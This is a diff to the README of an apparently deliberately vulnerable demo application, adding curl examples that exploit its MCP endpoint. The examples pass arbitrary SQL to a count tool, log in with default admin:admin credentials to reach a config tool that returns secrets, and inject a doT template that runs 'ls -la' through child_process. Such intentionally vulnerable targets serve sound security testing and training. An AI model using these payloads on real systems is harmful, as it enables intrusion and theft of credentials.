@@ -1233,6 +1233,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
   - **Sensitive Data Exposure via config_tool** - The `config_tool` returns application configuration including database credentials, API keys, and cloud storage URLs.
   - **Server-Side Template Injection via render_tool** - The `render_tool` accepts a custom template string that is compiled and executed using the doT template engine, allowing arbitrary code execution.
   - **Authentication and Session Management** - The `/api/mcp` endpoint supports optional authentication and per-client session tracking:
+
     - MCP sessions are independent from the regular API authentication/authorization flow.
     - `initialize` must be called first to establish an MCP session.
     - `initialize` returns `Mcp-Session-Id`.
@@ -1247,6 +1248,93 @@ Full configuration & usage examples can be found in our [demo project](https://g
     - MCP permissions are role-based using the same user model as the HTTP server (`admin` vs regular user).
     - Some tools require authenticated MCP sessions, while others are available without authentication.
     - `config_tool` is admin-only.
+
+  - **MCP Tool List (Quick Reference)**:
+
+    _Initialize guest MCP session (required for all non-`initialize` MCP calls):_
+
+    ```bash
+    BASE='https://brokencrystals.com'
+    INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
+      -H 'Content-Type: application/json' \
+      -d '{"jsonrpc":"2.0","method":"initialize","id":1}')
+    MCP_SESSION_ID=$(echo "$INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')
+    ```
+
+    1. `count_tool` (public)  
+       Vulnerability: **SQL Injection**.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+             "name": "count_tool",
+             "arguments": {
+               "query": "select count(*) as count from testimonial"
+             }
+           },
+           "id": 2
+         }'
+       ```
+
+    2. `render_tool` (public)  
+       Vulnerability: **Server-Side Template Injection (SSTI)** via user-controlled doT template.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+             "name": "render_tool",
+             "arguments": {
+               "numbers": [1],
+               "template": "The node version is: {{=process.version}}"
+             }
+           },
+           "id": 3
+         }'
+       ```
+
+    3. `config_tool` (admin only)  
+       Vulnerability: **Sensitive Data Exposure** (returns app configuration including secrets when allowed).  
+       Example (admin-authenticated MCP session):
+
+       ```bash
+       AUTH_HEADERS=$(curl -i -s "${BASE}/api/auth/admin/login" -X POST \
+         -H 'Content-Type: application/json' \
+         -d '{"user":"admin","password":"admin","op":"basic"}')
+       ADMIN_AUTH=$(echo "$AUTH_HEADERS" | awk -F': ' 'tolower($1)=="authorization"{print $2}' | tr -d '\r')
+
+       ADMIN_INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Authorization: ${ADMIN_AUTH}" \
+         -d '{"jsonrpc":"2.0","method":"initialize","id":4}')
+       ADMIN_MCP_SESSION_ID=$(echo "$ADMIN_INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')
+
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${ADMIN_MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+             "name": "config_tool",
+             "arguments": {
+               "include_sensitive": true
+             }
+           },
+           "id": 5
+         }'
+       ```
 
   <details>
     <summary>MCP Vulnerabilities Example Exploitation</summary>
@@ -1299,20 +1387,31 @@ Full configuration & usage examples can be found in our [demo project](https://g
      }
      ```
 
-  3. **Sensitive Data Exposure via config_tool**:
+  3. **Sensitive Data Exposure via config_tool** (admin-authenticated MCP session):
 
      ```bash
+     AUTH_HEADERS=$(curl -i -s "${BASE}/api/auth/admin/login" -X POST \
+       -H 'Content-Type: application/json' \
+       -d '{"user":"admin","password":"admin","op":"basic"}')
+     ADMIN_AUTH=$(echo "$AUTH_HEADERS" | awk -F': ' 'tolower($1)=="authorization"{print $2}' | tr -d '\r')
+
+     ADMIN_INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Authorization: ${ADMIN_AUTH}" \
+       -d '{"jsonrpc":"2.0","method":"initialize","id":3}')
+     ADMIN_MCP_SESSION_ID=$(echo "$ADMIN_INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')
+
      curl "${BASE}/api/mcp" -X POST \
        -H 'Content-Type: application/json' \
-       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -H "Mcp-Session-Id: ${ADMIN_MCP_SESSION_ID}" \
        -d '{
          "jsonrpc": "2.0",
          "method": "tools/call",
          "params": {
            "name": "config_tool",
-           "arguments": {}
-         },
-         "id": 3
+            "arguments": {}
+          },
+         "id": 4
        }'
      ```
 
@@ -1329,15 +1428,16 @@ Full configuration & usage examples can be found in our [demo project](https://g
            }
          ]
        },
-       "id": 3
+       "id": 4
      }
      ```
 
   4. **Server-Side Template Injection via render_tool**:
 
      ```bash
-     curl 'https://brokencrystals.com/api/mcp' -X POST \
+     curl "${BASE}/api/mcp" -X POST \
        -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
        -d '{
          "jsonrpc": "2.0",
          "method": "tools/call",
@@ -1348,7 +1448,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
              "template": "{{= global.process.mainModule.require('\''child_process'\'').execSync('\''ls -la'\'') }}"
            }
          },
-         "id": 4
+         "id": 5
        }'
      ```
 
